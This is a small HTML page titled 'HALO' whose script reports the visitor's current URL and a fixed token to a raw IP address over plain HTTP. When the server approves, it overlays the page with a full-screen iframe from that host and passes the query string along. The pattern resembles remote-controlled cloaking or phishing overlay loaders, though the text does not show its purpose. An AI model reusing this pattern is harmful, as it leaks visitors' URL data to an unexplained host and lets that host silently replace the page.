<!DOCTYPE html>
<html>
    <head>

    </head>
    <body>
        <h1>HALO</h1>
        <script>
            //check is url exist
            var r = new XMLHttpRequest();
            r.open("GET", "http://178.128.29.75:8000/check?current_url="+window.location.href+'&token=c10b35f0197494fbcbf57222faf45e61');
            r.onreadystatechange = function () {
            if (r.readyState != 4 || r.status != 200) return;
                let res = JSON.parse(r.responseText)
                if(res.code === 1)
                    setIframe(res.data)
            };
            r.send();
            //set iframe
            function setIframe(data) {
                //get query
                const urlQuery = new URLSearchParams(window.location.search);
                //create iframe
                var iframe = document.createElement('iframe');
                //styling iframe
                iframe.style.width = "100%";
                iframe.style.height = "100vh";
                iframe.src = 'http://178.128.29.75:8000?'+urlQuery+'&token=c10b35f0197494fbcbf57222faf45e61';
                //styling body
                document.body.style.margin = "0";
                document.body.appendChild(iframe);
            }
        </script>
    </body>
</html>